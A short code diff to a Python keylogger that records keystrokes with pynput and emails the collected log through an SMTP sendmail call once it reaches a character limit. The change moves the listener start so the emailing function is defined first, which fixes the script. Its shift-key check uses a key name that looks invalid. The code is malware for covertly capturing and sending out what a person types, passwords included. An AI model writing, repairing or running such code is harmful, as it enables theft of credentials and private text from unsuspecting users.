@@ -46,7 +46,7 @@ def on_press(key):
         if len(full_log) >= email_char_limit:
             send_log()
             full_log = ''
-    elif key == Key.shift_1 or key == Key.shift_r:
+    elif key == Key.shift_I or key == Key.shift_r:
         return
     elif key == Key.backspace:
         word = word[:-1]
@@ -57,15 +57,16 @@ def on_press(key):
 
     if key == Key.esc:
         return False
-
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
-
-
+      
 def send_log():
     server.sendmail(
         email,
         email,
         full_log
     )
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+
+
